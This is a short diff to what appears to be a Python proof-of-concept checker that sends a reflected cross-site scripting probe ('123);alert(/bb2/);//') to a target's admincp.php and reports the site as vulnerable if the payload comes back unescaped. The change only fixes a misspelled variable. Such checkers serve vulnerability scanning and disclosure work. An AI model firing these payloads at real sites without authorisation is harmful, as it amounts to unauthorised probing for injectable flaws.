@@ -35,7 +35,7 @@ class Poc(ABPoc):
                     target=self.target, vuln=self.vuln))
             verify_url = self.target + "/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);//"
             req = urllib2.Request(verify_url)
-            erify_urcontent = urllib2.urlopen(req).read()
+            content = urllib2.urlopen(req).read()
             if "if($('return_123);alert(/bb2/);//'" in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
